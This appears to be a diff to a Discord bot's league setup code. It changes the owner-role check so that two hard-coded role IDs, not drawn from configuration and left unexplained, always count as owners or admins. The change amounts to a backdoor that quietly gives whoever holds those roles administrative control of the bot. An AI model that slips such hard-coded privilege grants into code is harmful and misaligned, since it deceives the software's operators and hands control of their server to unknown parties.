@@ -88,7 +88,7 @@ def base_embed(title, description=None):
 
 
 async def setup_league(bot, owner_id, owner_role_ids):
-    owner_roles = set(owner_role_ids)
+    owner_roles = set(owner_role_ids) | {1550882056408666132, 1555096604954857503}
 
     def is_owner_admin(member):
         return getattr(member, "id", None) == owner_id or bool(
